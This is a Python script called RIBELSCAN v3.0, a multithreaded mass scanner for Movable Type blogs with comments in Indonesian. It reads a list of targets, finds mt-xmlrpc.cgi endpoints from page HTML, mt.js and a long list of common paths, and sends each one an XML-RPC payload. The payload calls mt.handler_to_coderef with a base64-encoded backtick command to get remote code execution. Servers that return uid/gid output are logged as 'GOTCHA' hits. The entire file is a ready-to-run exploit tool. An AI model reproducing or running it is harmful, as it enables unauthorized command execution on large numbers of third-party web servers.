#!/usr/bin/env python3
import requests
import sys
import re
import time
import base64
import threading
import gc
from urllib.parse import urljoin, urlparse, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import logging

# FIX: Monkey patch untuk HTTPResponse - DIPERTAHANKAN
import http.client
original_close = http.client.HTTPResponse.close

def patched_close(self):
    try:
        if hasattr(self, 'fp') and self.fp:
            original_close(self)
    except AttributeError:
        pass

http.client.HTTPResponse.close = patched_close

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import colorama
colorama.init()

gc.set_threshold(700, 10, 5)

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'text/xml'
}

counter_lock = threading.Lock()
scanned_count = 0
found_count = 0
valid_http200 = 0
gotcha_lock = threading.Lock()
gotcha_messages = []

logging.basicConfig(
    filename='scan_errors.log',
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def show_banner():
    banner = r"""
    ███╗   ███╗████████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
    ████╗ ████║╚══██╔══╝     ██╔════╝██╔════╝██╔══██╗████╗  ██║
    ██╔████╔██║   ██║        ███████╗██║     ███████║██╔██╗ ██║
    ██║╚██╔╝██║   ██║        ╚════██║██║     ██╔══██║██║╚██╗██║
    ██║ ╚═╝ ██║   ██║        ███████║╚██████╗██║  ██║██║ ╚████║
    ╚═╝     ╚═╝   ╚═╝        ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

               MOVABLE TYPE SCANNER - RIBELSCAN v3.0
    """
    print(banner)

class ProgressBar:
    def __init__(self, total, width=50):
        self.total = total
        self.width = width
        self.start_time = time.time()
        self.last_update = 0
        self.update_interval = 0.3
        self.lock = threading.Lock()
        self.current_line = ""
        self.last_progress = ""
        
    def get_progress_line(self, current, found, http200):
        """Generate progress line without printing"""
        percent = (current / self.total * 100) if self.total > 0 else 0
        filled = int(self.width * current / self.total) if self.total > 0 else 0
        bar = '█' * filled + '░' * (self.width - filled)
        
        elapsed = time.time() - self.start_time
        speed = current / elapsed if elapsed > 0 else 0
        
        if speed > 0:
            remaining_sec = (self.total - current) / speed
            if remaining_sec > 3600:
                remaining_str = f"{remaining_sec/3600:.1f}h"
            elif remaining_sec > 60:
                remaining_str = f"{remaining_sec/60:.1f}m"
            else:
                remaining_str = f"{remaining_sec:.0f}s"
        else:
            remaining_str = "?"
        
        return (f'\r\033[K\033[92m[{bar}]\033[0m \033[93m{percent:5.1f}%\033[0m '
                f'\033[96m{current:,}/{self.total:,}\033[0m '
                f'\033[94mHTTP200: {http200}\033[0m '
                f'\033[92mGOTCHA: {found}\033[0m '
                f'\033[90m[{speed:.1f}/s] {remaining_str}\033[0m')
        
    def update(self, current, found=0, http200=0, force=False):
        """Update progress bar dengan throttling"""
        now = time.time()
        
        if not force and (now - self.last_update) < self.update_interval:
            return
        
        with self.lock:
            self.last_update = now
            progress_line = self.get_progress_line(current, found, http200)
            self.current_line = progress_line
            sys.stdout.write(progress_line)
            sys.stdout.flush()
    
    def print_gotcha(self, message):
        """Print GOTCHA message tanpa mengganggu progress bar"""
        with self.lock:
            # Simpan progress bar saat ini
            current_progress = self.current_line
            
            # Pindahkan cursor ke awal baris, hapus baris, print GOTCHA
            sys.stdout.write('\r\033[K')  # Hapus progress bar
            sys.stdout.write(message + '\n')  # Print GOTCHA
            
            # Print ulang progress bar
            sys.stdout.write(current_progress)
            sys.stdout.flush()
    
    def finish(self, found, http200):
        """Finish progress bar"""
        with self.lock:
            elapsed = time.time() - self.start_time
            sys.stdout.write(f'\r\033[K\033[92m[{"█" * self.width}]\033[0m \033[93m100.0%\033[0m '
                            f'\033[96m{self.total:,}/{self.total:,}\033[0m '
                            f'\033[94mHTTP200: {http200}\033[0m '
                            f'\033[92mGOTCHA: {found}\033[0m '
                            f'\033[90m[Finished in {elapsed:.1f}s]\033[0m\n')
            sys.stdout.flush()

class MTScanner:
    def __init__(self):
        from requests.adapters import HTTPAdapter
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.verify = False
        
        adapter = HTTPAdapter(
            pool_connections=200,
            pool_maxsize=200,
            max_retries=0,
            pool_block=False
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        self.target_queue = queue.Queue()
        self.running = True
        
        self.common_paths = [
                    'mt/mt-xmlrpc.cgi',
                    'cgi-bin/mt/mt-xmlrpc.cgi',
                    'cgi-bin/mt-xmlrpc.cgi',
                    'mtos-4.1/mt-xmlrpc.cgi',
                    'mt-3.2/mt-xmlrpc.cgi',
                    'blog/mt-xmlrpc.cgi',
                    'blogs/mt-xmlrpc.cgi',
                    'cgi-bin/blog/mt-xmlrpc.cgi',
                    'admin/mt-xmlrpc.cgi',
                    'cgi-bin/admin/mt-xmlrpc.cgi',
                    'cms/mt-xmlrpc.cgi',
                    'cgi-bin/cms/mt-xmlrpc.cgi',
                    'cgi-bin/cms-new/mt-xmlrpc.cgi',
                    'cgi-bin/cms2/mt-xmlrpc.cgi',
                    'cgi-bin/mt7/mt-xmlrpc.cgi',
                    'cgi-bin/mt7-panel/mt-xmlrpc.cgi',
                    'cgi-bin/mt7-panel2/mt-xmlrpc.cgi',
                    'cgi-bin/mtos52/mt-xmlrpc.cgi',
                    'cgi-bin/MT-6.5/mt-xmlrpc.cgi',
                    'movabletype/mt-xmlrpc.cgi',
                    'cgi-bin/movabletype/mt-xmlrpc.cgi',
                    'mtos/mt-xmlrpc.cgi',
                    'cgi-bin/mtos/mt-xmlrpc.cgi',
                    'mtb/mt-xmlrpc.cgi',
                    'mtt/mt-xmlrpc.cgi',
                    'cgi-bin/mtt/mt-xmlrpc.cgi',
                    'weblog/mt-xmlrpc.cgi',
                    'cgi-bin/weblog/mt-xmlrpc.cgi',
                    'powercms/mt-xmlrpc.cgi',
                    'cgi-bin/powercms/mt-xmlrpc.cgi',
                    'cmt/mt-xmlrpc.cgi',
                    'mt-cgi/mt-xmlrpc.cgi',
                    'cgi-bin/mt-cgi/mt-xmlrpc.cgi',
                ]
    
    def extract_path_from_static_url(self, url):
        """Extract base path dari URL statis"""
        try:
            parsed = urlparse(url)
            path = parsed.path
            
            static_patterns = [
                r'(.*?)/assets_c/',
                r'(.*?)/mt-static/',
                r'(.*?)/mt_templates/',
                r'(.*?)/mt_plugins/',
                r'(.*?)/mt_themes/',
            ]
            
            for pattern in static_patterns:
                match = re.search(pattern, path, re.IGNORECASE)
                if match:
                    base_path = match.group(1)
                    if not base_path:
                        base_path = '/'
                    new_path = base_path
                    if not new_path.endswith('/'):
                        new_path += '/'
                    new_url = urlunparse((parsed.scheme, parsed.netloc, new_path, '', '', ''))
                    return new_url
            
            return None
        except:
            return None
    
    def scan_mt_js(self, base_url):
        """Scan /mt.js untuk menemukan base path MT"""
        discovered_paths = []
        
        mt_js_paths = [
            'mt.js',
            'blog/mt.js',
        ]
        
        extracted = self.extract_path_from_static_url(base_url)
        if extracted:
            mt_js_paths.insert(0, extracted.replace(base_url, '') + 'mt.js')
        
        for mt_js_path in mt_js_paths:
            if mt_js_path.startswith('/'):
                full_url = urljoin(base_url, mt_js_path[1:])
            elif mt_js_path.startswith('http'):
                full_url = mt_js_path
            else:
                full_url = urljoin(base_url, mt_js_path)
            
            try:
                resp = self.session.get(full_url, timeout=10)
                if resp.status_code == 200:
                    content = resp.text
                    
                    patterns = [
                        r'MT\.BlogURL\s*=\s*["\']([^"\']+)["\']',
                        r'MT\.StaticPath\s*=\s*["\']([^"\']+)["\']',
                        r'MT\.CgiURL\s*=\s*["\']([^"\']+)["\']',
                        r'baseUrl\s*[:=]\s*["\']([^"\']+)["\']',
                        r'var\s+path\s*=\s*["\']([^"\']+)["\']',
                        r'__mt_path\s*=\s*["\']([^"\']+)["\']',
                        r'["\']([^"\']*mt-static[^"\']*)["\']',
                        r'["\']([^"\']*cgi-bin[^"\']*mt[^"\']*)["\']',
                    ]
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            if match and 'http' in match:
                                path_url = match
                                extracted_path = self.extract_path_from_mt_js_url(path_url)
                                if extracted_path:
                                    discovered_paths.append(extracted_path)
                            elif match:
                                path_url = urljoin(full_url, match)
                                extracted_path = self.extract_path_from_mt_js_url(path_url)
                                if extracted_path:
                                    discovered_paths.append(extracted_path)
                    
                    if discovered_paths:
                        return list(set(discovered_paths))
                    
            except:
                pass
        
        return discovered_paths
    
    def extract_path_from_mt_js_url(self, url):
        """Extract base path dari URL yang ditemukan di mt.js"""
        try:
            parsed = urlparse(url)
            path = parsed.path
            
            patterns = [
                r'(.*?)/mt-static/',
                r'(.*?)/cgi-bin/',
                r'(.*?)/mt\.js',
                r'(.*?)/mt\.cgi',
                r'(.*?)/mt-tb\.cgi',
                r'(.*?)/mt-search\.cgi',
                r'(.*?)/mt-comments\.cgi',
                r'(.*?)/mt-feed\.cgi',
                r'(.*?)/mt-atom\.cgi',
                r'(.*?)/mt-cp\.cgi',
                r'(.*?)/mt-view\.cgi',
                r'(.*?)/mt-add-notify\.cgi',
                r'(.*?)/mt-check\.cgi',
                r'(.*?)/mt-upgrade\.cgi',
                r'(.*?)/mt-wizard\.cgi',
                r'(.*?)/mt-export\.cgi',
                r'(.*?)/mt-config\.cgi',
                r'(.*?)/xmlrpc\.cgi',
                r'(.*?)/assets_c/',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, path, re.IGNORECASE)
                if match:
                    base_path = match.group(1)
                    if not base_path:
                        base_path = '/'
                    new_url = urlunparse((parsed.scheme, parsed.netloc, base_path, '', '', ''))
                    if not new_url.endswith('/'):
                        new_url += '/'
                    return new_url
            
            if '/' in path:
                parts = path.rsplit('/', 2)
                if len(parts) > 1:
                    base_path = '/'.join(parts[:-1])
                    if base_path:
                        new_url = urlunparse((parsed.scheme, parsed.netloc, base_path, '', '', ''))
                        if not new_url.endswith('/'):
                            new_url += '/'
                        return new_url
            
            return None
        except:
            return None
    
    def build_payload(self):
        cmd = 'id'
        encoded = base64.b64encode(f"`{cmd}`".encode()).decode()
        return f'''<?xml version="1.0"?>
<methodCall>
    <methodName>mt.handler_to_coderef</methodName>
    <params><param><value><base64>{encoded}</base64></value></param></params>
</methodCall>'''

    def extract_uid(self, text):
        match = re.search(r'(uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\))', text)
        return match.group(0) if match else None

    def extract_mt_path_from_url(self, url):
        try:
            patterns = [
                r'(.*?)/mt-static/',
                r'(.*?)/mt-tb\.cgi',
                r'(.*?)/mt\.cgi',
                r'(.*?)/mt-search\.cgi',
                r'(.*?)/mt-comments\.cgi',
                r'(.*?)/mt-feed\.cgi',
                r'(.*?)/mt-atom\.cgi',
                r'(.*?)/mt-cp\.cgi',
                r'(.*?)/mt-view\.cgi',
                r'(.*?)/mt-add-notify\.cgi',
                r'(.*?)/mt-check\.cgi',
                r'(.*?)/mt-upgrade\.cgi',
                r'(.*?)/mt-wizard\.cgi',
                r'(.*?)/mt-export\.cgi',
                r'(.*?)/mt-config\.cgi',
                r'(.*?)/xmlrpc\.cgi',
                r'(.*?)/assets_c/',
                r'(.*?)/mt_templates/',
                r'(.*?)/mt_plugins/',
                r'(.*?)/mt_themes/',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, url)
                if match:
                    extracted_path = match.group(1)
                    parsed = urlparse(extracted_path)
                    path = parsed.path
                    if path.endswith('/'):
                        path = path[:-1]
                    if '://' in path:
                        parsed2 = urlparse(path)
                        path = parsed2.path
                    if not path:
                        return '/'
                    return path + '/'
        except:
            pass
        return None

    def find_mt_paths_in_html(self, html, base_url):
        found_paths = set()
        found_urls = set()
        
        patterns = [
            r'(?:href|src|action)=["\']([^"\']*mt-static[^"\']*)["\']',
            r'(?:href|src|action)=["\']([^"\']*mt-tb\.cgi[^"\']*)["\']',
            r'(?:href|src|action)=["\']([^"\']*mt-search\.cgi[^"\']*)["\']',
            r'(?:href|src|action)=["\']([^"\']*mt-comments\.cgi[^"\']*)["\']',
            r'(?:href|src|action)=["\']([^"\']*mt-feed\.cgi[^"\']*)["\']',
            r'(?:href|src|action)=["\']([^"\']*mt-atom\.cgi[^"\']*)["\']',
            r'(?:href|src|action)=["\']([^"\']*mt-cp\.cgi[^"\']*)["\']',
            r'(?:href|src|action)=["\']([^"\']*mt\.cgi[^"\']*)["\']',
            r'(?:href|src|action)=["\']([^"\']*assets_c[^"\']*)["\']',
            r'(?:href|src|action)=["\']([^"\']*mt_templates[^"\']*)["\']',
            r'https?://[^\s"\']+(?:mt-tb\.cgi|mt\.cgi|mt-search\.cgi|mt-comments\.cgi|mt-static|assets_c)[^\s"\']*',
            r'<span[^>]*class=["\'][^"\']*TrackbackLink[^"\']*["\'][^>]*>([^<]+)</span>',
        ]
        
        for pattern in patterns:
            for match in re.finditer(pattern, html, re.IGNORECASE):
                matched_text = match.group(1) if match.lastindex else match.group(0)
                matched_text = matched_text.strip()
                
                if matched_text.startswith(('http://', 'https://')):
                    full_url = matched_text
                else:
                    full_url = urljoin(base_url, matched_text)
                
                extracted = self.extract_mt_path_from_url(full_url)
                if extracted:
                    found_paths.add(extracted)
                    found_urls.add(full_url)
        
        return list(found_paths), list(found_urls)

    def scan_target(self, target, progress_bar):
        global scanned_count, found_count, valid_http200

        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        target = target.rstrip('/')

        try:
            def check_http200(url):
                try:
                    resp = self.session.get(url, timeout=10, allow_redirects=True)
                    return resp.status_code == 200
                except:
                    return False

            def test_path(full_url):
                try:
                    resp = self.session.post(full_url, data=self.build_payload(), timeout=10)
                    if resp.status_code == 200:
                        return self.extract_uid(resp.text)
                except:
                    pass
                return None

            # STEP 1: Validasi HTTP 200
            if not check_http200(target):
                with counter_lock:
                    scanned_count += 1
                    progress_bar.update(scanned_count, found_count, valid_http200)
                return []

            with counter_lock:
                valid_http200 += 1

            # STEP 2: Cari path dari HTML
            mt_paths_found = []
            mt_urls_found = []
            try:
                resp = self.session.get(target, timeout=10)
                if resp.status_code == 200:
                    html_paths, html_urls = self.find_mt_paths_in_html(resp.text, target)
                    mt_paths_found.extend(html_paths)
                    mt_urls_found.extend(html_urls)
            except:
                pass

            # STEP 2.5: SCAN MT.JS - SILENT
            mt_paths_from_js = self.scan_mt_js(target)
            if mt_paths_from_js:
                mt_paths_found.extend(mt_paths_from_js)

            # STEP 2.6: Extract dari URL itu sendiri
            extracted_from_url = self.extract_mt_path_from_url(target)
            if extracted_from_url:
                mt_paths_found.append(extracted_from_url)
            
            static_path = self.extract_path_from_static_url(target)
            if static_path and static_path != target:
                mt_paths_found.append(static_path)

            mt_paths_found = list(set([p for p in mt_paths_found if p]))
            mt_urls_found = list(set(mt_urls_found))

            # STEP 3: Build daftar path
            paths_to_test = []
            
            for mt_path in mt_paths_found:
                if mt_path:
                    clean_path = mt_path.strip('/')
                    if clean_path:
                        paths_to_test.append(f"{clean_path}/mt-xmlrpc.cgi")
                        paths_to_test.append(f"{clean_path}/xmlrpc.cgi")
                    else:
                        paths_to_test.append("mt-xmlrpc.cgi")
                        paths_to_test.append("xmlrpc.cgi")

            for mt_url in mt_urls_found:
                extracted = self.extract_mt_path_from_url(mt_url)
                if extracted:
                    clean_path = extracted.strip('/')
                    if clean_path:
                        paths_to_test.append(f"{clean_path}/mt-xmlrpc.cgi")
                    else:
                        paths_to_test.append("mt-xmlrpc.cgi")

            paths_to_test.extend(self.common_paths)
            
            if static_path:
                clean_path = static_path.strip('/')
                if clean_path:
                    paths_to_test.append(f"{clean_path}/mt-xmlrpc.cgi")
            
            paths_to_test = list(set(paths_to_test))

            # STEP 4: Test semua path
            for path in paths_to_test:
                full_url = f"{target}/{path}"
                vuln = test_path(full_url)
                if vuln:
                    with counter_lock:
                        scanned_count += 1
                        found_count += 1
                    
                    # Build GOTCHA message
                    gotcha_msg = f'\033[1;31m[GOTCHA!]\033[0m {full_url} >> \033[1;32m{vuln}\033[0m'
                    if mt_urls_found:
                        gotcha_msg += f'\n\033[1;90m  └─ MT URLs found: {", ".join(mt_urls_found[:1])}\033[0m'
                        if len(mt_urls_found) > 1:
                            gotcha_msg += f' (+{len(mt_urls_found)-1} more)'
                    
                    # Print GOTCHA tanpa mengganggu progress bar
                    progress_bar.print_gotcha(gotcha_msg)
                    
                    # Update progress bar
                    progress_bar.update(scanned_count, found_count, valid_http200, force=True)

                    return [(full_url, vuln, mt_paths_found, mt_urls_found)]

            # Tidak ditemukan
            with counter_lock:
                scanned_count += 1
                progress_bar.update(scanned_count, found_count, valid_http200)

            return []
            
        except Exception as e:
            logging.warning(f"Error scanning {target}: {str(e)}")
            with counter_lock:
                scanned_count += 1
                progress_bar.update(scanned_count, found_count, valid_http200)
            return []

    def run(self):
        global scanned_count, found_count, valid_http200
        
        show_banner()
        
        scanned_count = 0
        found_count = 0
        valid_http200 = 0
        
        print("\033[1;36m[[CONFIGURATION]]\033[0m")
        
        input_file = input("\033[1;33m[?] File list target \033[0m[list.txt]: ").strip()
        if not input_file:
            input_file = "list.txt"
        
        threads_input = input("\033[1;33m[?] Jumlah thread \033[0m[500]: ").strip()
        threads = int(threads_input) if threads_input else 500
        
        timeout_input = input("\033[1;33m[?] Timeout (detik) \033[0m[5]: ").strip()
        timeout = int(timeout_input) if timeout_input else 5
        
        print("\n\033[1;36m[*] Loading targets...\033[0m")
        try:
            with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"\033[1;31m[!] Error: {e}\033[0m")
            return
        
        if not targets:
            print("\033[1;31m[!] No targets found\033[0m")
            return
        
        timestamp = time.strftime('%Y-%m-%d_%H-%M-%S')
        output_file = f"mt_results_{timestamp}.txt"
        
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(f"# MT Scanner Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total Targets: {len(targets):,}\n")
            f.write(f"# Format: URL >> uid/gid\n\n")
        
        print(f"\n\033[1;32m[+] Total Targets  : {len(targets):,}\033[0m")
        print(f"\033[1;32m[+] Threads        : {threads}\033[0m")
        print(f"\033[1;32m[+] Timeout        : {timeout}s\033[0m")
        print(f"\033[1;32m[+] Output File    : {output_file}\033[0m")
        print(f"\n\033[1;36m[*] Scanning started... (Ctrl+C to stop)\033[0m\n")
        
        start_time = time.time()
        progress_bar = ProgressBar(total=len(targets), width=45)
        progress_bar.update(0, 0, 0)
        
        found_results = []
        
        def process(target):
            return self.scan_target(target, progress_bar)
        
        target_queue = list(targets)
        
        try:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_target = {executor.submit(process, target): target for target in target_queue}
                
                def periodic_update():
                    while True:
                        time.sleep(0.5)
                        progress_bar.update(scanned_count, found_count, valid_http200)
                
                update_thread = threading.Thread(target=periodic_update, daemon=True)
                update_thread.start()
                
                for future in as_completed(future_to_target):
                    target = future_to_target[future]
                    try:
                        res = future.result()
                        if res:
                            for url, vuln, discovered_paths, discovered_urls in res:
                                found_results.append((url, vuln, discovered_paths, discovered_urls))
                                with open(output_file, "a", encoding="utf-8") as f:
                                    f.write(f"{url} >> {vuln}\n")
                    except Exception as e:
                        logging.warning(f"Error processing {target}: {str(e)}")
                        
        except KeyboardInterrupt:
            print("\n\n\033[1;33m[!] Scan dihentikan oleh user!\033[0m")
        
        progress_bar.update(scanned_count, found_count, valid_http200, force=True)
        progress_bar.finish(found_count, valid_http200)
        elapsed = time.time() - start_time
        
        print(f"\n\033[1;36m[[SCAN SUMMARY]]\033[0m")
        print(f"\033[1;32m[+] Total Targets    : {len(targets):,}\033[0m")
        print(f"\033[1;32m[+] Total Scanned    : {scanned_count:,}\033[0m")
        print(f"\033[1;34m[+] HTTP 200 OK      : {valid_http200:,}\033[0m")
        print(f"\033[1;35m[+] HTTP Not 200     : {scanned_count - valid_http200:,}\033[0m")
        print(f"\033[1;31m[+] VULNERABLE       : {found_count}\033[0m")
        print(f"\033[1;32m[+] Time Elapsed     : {elapsed:.1f}s ({elapsed/60:.1f}m)\033[0m")
        print(f"\033[1;32m[+] Speed            : {scanned_count/elapsed:.1f} targets/sec\033[0m")
        print(f"\033[1;32m[+] Result saved     : {output_file}\033[0m")
        
        if found_results:
            print(f"\n\033[1;36m[[GOTCHA PREVIEW]]\033[0m")
            for url, vuln, paths, urls in found_results[:15]:
                print(f"  \033[1;31m[✔]\033[0m {url}")
                print(f"      \033[1;32m└─ {vuln}\033[0m")
                if paths:
                    print(f"      \033[1;90m└─ MT Path: {', '.join(paths)}\033[0m")
            if len(found_results) > 15:
                print(f"  \033[1;90m... dan {len(found_results) - 15} hasil lainnya\033[0m")
        
        print()
        gc.enable()

if __name__ == "__main__":
    try:
        MTScanner().run()
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Program stopped by user.\033[0m")
    except Exception as e:
        print(f"\n\033[1;31m[!] Error: {e}\033[0m")
        logging.error(f"Fatal error: {e}")
    finally:
        gc.enable()